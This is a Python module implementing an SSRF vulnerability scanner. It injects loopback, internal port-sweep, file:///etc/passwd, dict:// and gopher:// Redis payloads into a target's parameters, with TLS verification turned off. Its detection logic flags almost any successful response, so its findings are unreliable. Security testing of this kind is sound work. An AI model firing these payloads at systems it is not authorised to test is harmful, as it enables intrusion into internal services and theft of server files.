"""
Integration module for SSRF scanning
"""

import requests
from typing import Dict, List, Optional, Any
import logging
import socket
import concurrent.futures
from urllib.parse import urlparse, urljoin
import json

class SSRFScanner:
    """Scanner to detect SSRF vulnerabilities."""
    
    def __init__(self, callback=None):
        self.callback = callback
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.verify = False
        self.common_ports = [21, 22, 80, 443, 8080, 8443]
        
    def scan_url(self, url: str, params: Dict = None) -> List[Dict[str, Any]]:
        """Scans a URL for SSRF vulnerabilities."""
        results = []
        
        try:
            # Verify base URL
            parsed_url = urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                raise ValueError("Invalid URL")
                
            # Detect parameters if not provided
            if not params:
                params = self._detect_parameters(url)
                
            # Test different types of payloads
            for param_name, param_value in params.items():
                # Basic payloads
                basic_results = self._test_basic_ssrf(url, param_name)
                if basic_results:
                    results.extend(basic_results)
                    
                # Blind SSRF
                blind_results = self._test_blind_ssrf(url, param_name)
                if blind_results:
                    results.extend(blind_results)
                    
                # Internal port scanning
                port_results = self._test_internal_port_scan(url, param_name)
                if port_results:
                    results.extend(port_results)
                    
                # Alternative protocols
                protocol_results = self._test_protocol_ssrf(url, param_name)
                if protocol_results:
                    results.extend(protocol_results)
                    
            return results
            
        except Exception as e:
            self.logger.error(f"Error during SSRF scan: {str(e)}")
            return []
            
    def _detect_parameters(self, url: str) -> Dict[str, str]:
        """Detects potential parameters in the URL."""
        params = {}
        try:
            # Parameters in URL
            parsed = urlparse(url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                        
            # Try to detect hidden parameters by parsing forms
            response = self.session.get(url)
            
            # Search in forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                for input_field in form.find_all(['input', 'textarea']):
                    name = input_field.get('name')
                    if name:
                        params[name] = input_field.get('value', '')
                        
        except Exception as e:
            self.logger.error(f"Error detecting parameters: {str(e)}")
            
        return params
        
    def _test_basic_ssrf(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Tests basic SSRF."""
        results = []
        payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443'
        ]
        
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, allow_redirects=False)
                
                if self._analyze_ssrf_response(response):
                    result = {
                        'type': 'Basic SSRF',
                        'param': param,
                        'payload': payload,
                        'evidence': response.text[:200]
                    }
                    results.append(result)
                    if self.callback:
                        self.callback(result)
                        
            except Exception as e:
                self.logger.error(f"Error in basic SSRF test: {str(e)}")
                
        return results
        
    def _test_blind_ssrf(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Tests blind SSRF."""
        results = []
        # Here one should ideally use a callback service such as Burp Collaborator
        # For now, we use a simple example
        payloads = [
            'http://example.com/ssrf-test',
            'https://ssl.example.com/ssrf-test'
        ]
        
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=5)
                
                # Analyze response time to detect blind SSRF
                if response.elapsed.total_seconds() > 3:
                    result = {
                        'type': 'Blind SSRF',
                        'param': param,
                        'payload': payload,
                        'evidence': f'Response time: {response.elapsed.total_seconds()}s'
                    }
                    results.append(result)
                    if self.callback:
                        self.callback(result)
                        
            except requests.Timeout:
                # Timeout might indicate a successful blind SSRF
                result = {
                    'type': 'Blind SSRF (timeout)',
                    'param': param,
                    'payload': payload,
                    'evidence': 'Request timed out'
                }
                results.append(result)
                if self.callback:
                    self.callback(result)
                    
            except Exception as e:
                self.logger.error(f"Error in blind SSRF test: {str(e)}")
                
        return results
        
    def _test_internal_port_scan(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Tests internal port scanning via SSRF."""
        results = []
        base_payload = 'http://127.0.0.1:{}'
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_port = {
                executor.submit(self._check_port, url, param, base_payload.format(port)): port
                for port in self.common_ports
            }
            
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        if self.callback:
                            self.callback(result)
                except Exception as e:
                    self.logger.error(f"Error scanning port {port}: {str(e)}")
                    
        return results
        
    def _check_port(self, url: str, param: str, payload: str) -> Optional[Dict[str, Any]]:
        """Checks a specific port via SSRF."""
        try:
            params = {param: payload}
            response = self.session.get(url, params=params, timeout=2)
            
            if self._analyze_ssrf_response(response):
                return {
                    'type': 'SSRF - Open Port',
                    'param': param,
                    'payload': payload,
                    'evidence': f'Accessible port, response: {response.text[:100]}'
                }
                
        except requests.Timeout:
            # A timeout might indicate that the port is filtered
            return {
                'type': 'SSRF - Filtered Port',
                'param': param,
                'payload': payload,
                'evidence': 'Timeout when trying to access the port'
            }
            
        except Exception as e:
            self.logger.error(f"Error checking port: {str(e)}")
            
        return None
        
    def _test_protocol_ssrf(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Tests SSRF with different protocols."""
        results = []
        payloads = [
            'file:///etc/passwd',
            'dict://127.0.0.1:11211/stats',
            'gopher://127.0.0.1:6379/_GET%20keys%20*',
            'ldap://127.0.0.1:389',
            'ftp://127.0.0.1:21'
        ]
        
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=3)
                
                if self._analyze_ssrf_response(response):
                    result = {
                        'type': 'SSRF - Alternative Protocol',
                        'param': param,
                        'payload': payload,
                        'evidence': response.text[:200]
                    }
                    results.append(result)
                    if self.callback:
                        self.callback(result)
                        
            except Exception as e:
                self.logger.error(f"Error in protocol test: {str(e)}")
                
        return results
        
    def _analyze_ssrf_response(self, response: requests.Response) -> bool:
        """Analyzes the response to detect a successful SSRF."""
        # Patterns that might indicate a successful SSRF
        success_patterns = [
            'root:x:0:0',  # /etc/passwd
            'uid=',  # System info
            'mysql>',  # MySQL
            'redis_version',  # Redis
            'error 1045',  # MySQL error
            'ftp server ready'  # FTP
        ]
        
        # Check for patterns in the response
        response_text = response.text.lower()
        for pattern in success_patterns:
            if pattern.lower() in response_text:
                return True
                
        # Check for unusual response codes
        if response.status_code in [200, 301, 302, 307, 308]:
            # Analyze response length
            if len(response.content) > 0:
                return True
                
        return False
